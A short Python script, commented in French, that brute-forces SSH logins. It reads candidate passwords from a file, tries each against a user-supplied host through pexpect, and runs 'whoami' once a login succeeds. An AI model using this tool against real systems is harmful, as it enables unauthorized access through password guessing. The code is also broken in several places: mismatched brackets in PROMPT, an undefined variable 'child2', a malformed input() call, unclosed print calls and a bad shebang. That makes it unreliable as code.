#!usr/bin/python

import pexpect #va nous servir a automatiser le processus de login ssh
from termcolor import colored

PROMPT = {'# ', '>>> ', '> ', '\$ '] #on s'attend a nous demander ca
def send_command(child, command):
	child.sendline(command)
	child.expect(PROMPT)
	print(child.before) #print l'output de la commande executee sur le systeme cible

def connect(user, host, password):
	ssh_newkey = 'Are you sure you want to continue connecting' #message qui nous demande une reponse
	connStr = 'ssh ' + user + '@' + host #equivaut a la commande ssh user@IP
	child = pexpect.spawn(connStr) #on lance la connection
	ret  = child.expect([pexpect.TIMEOUT, ssh_newkey, '[P|p]assword: '])
	if ret == 0: #correspond au timeout
		print('[-] Error Connecting') #si ca renvoie un 0 c'est qu'on a pas pu se connecter
		return
	if ret == 1: #correspond au ssh_newkey
		child2.sendline('yes') #si ca renvoie un 1 c'est qu'on s'est connnecte, ensuite on veut repondre yes a la question
		ret = child.expect([pexpect.TIMEOUT, '[P|p]assword '])
		if ret == 0:
			print('[-] Error connecting')
			return
	child.sendline(password)
	child.expect(PROMPT, timeout=0.5) #sans timeout il a pas le temps de se connecter
	return child #retourne la conncetion SSH

def main():
	host = input("Enter IP to bruteforce: ")
	user = input("Enter user you want to bruteforce": )
	file = open('passwords.txt', 'r') #ficchier contenant les mdp a tester
	for password in file.readlines():
		password= password.strip('\n')
		try:
			child = connect(user,host,password)
			print(colored('Password found: '+ password, 'green')
			send_command(child, 'whoami')
		except:
			print(colored('[-] Wrong password: ' + password, 'red')


main()
